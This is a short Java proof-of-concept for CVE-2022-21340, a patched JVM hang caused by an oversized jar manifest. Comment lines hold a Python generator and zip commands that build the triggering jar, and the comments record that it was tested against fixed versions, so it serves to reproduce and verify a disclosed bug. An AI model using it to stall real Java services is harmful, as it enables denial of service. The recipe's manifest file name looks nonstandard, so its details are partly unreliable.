import java.util.Map;
import java.util.jar.Attributes;
import java.util.jar.JarFile;

// CVE-2022-21340
// Fixed in Oracle Java SE 17.0.2, 11.0.14, 8u321, and 7u331.
// The JVM (tested with 11.0.1) hangs on a jar file generated with the following
// 'generate.py' Python script
//
// print("a: " + 230*"b ")
// for i in range(0,300000):
//     print(" " + 230*"b ")
//
// $ mkdir META-INF
// $ python3 generate.py > META-INF/MANIFEST.INF
// $ zip -rv test.jar META-INF
//
// Tested on 11.0.14 and the JVM does not hang anymore.

public class Main {
	
	public static void main(String[] args) throws Exception {
		
		// a line in a jar manifest is max 512 bytes
		// all lines with space and single letters
		
		// target jar file
		String TARGET_JAR = args[0];
		
		// printHeapInfo();
		System.out.println("start reading jar..."+TARGET_JAR);
		java.util.jar.JarFile jf = new JarFile(TARGET_JAR);
		Map<String, Attributes> e2a = jf.getManifest().getEntries();
		Attributes ma = jf.getManifest().getMainAttributes();
		String v = ma.getValue("a1000");
		System.out.println("value for a0: " + v);
		System.out.println("entries: "+ e2a.keySet().size());
		for (String s: e2a.keySet()) {
			System.out.println("key: "+ s);
		}
		System.out.println("end reading jar...");
	}
	
//	public static void printHeapInfo() {
//		// Get current size of heap in bytes
//		long heapSize = Runtime.getRuntime().totalMemory(); 
//
//		// Get maximum size of heap in bytes. The heap cannot grow beyond this size.// Any attempt will result in an OutOfMemoryException.
//		long heapMaxSize = Runtime.getRuntime().maxMemory();
//
//		 // Get amount of free memory within the heap in bytes. This size will increase // after garbage collection and decrease as new objects are created.
//		long heapFreeSize = Runtime.getRuntime().freeMemory();
//		System.out.println("heapSize:     "+ heapSize);
//		System.out.println("MAXheapSize:  "+ heapMaxSize);
//		System.out.println("heaFREEpSize: "+ heapFreeSize);
//	}
	
}
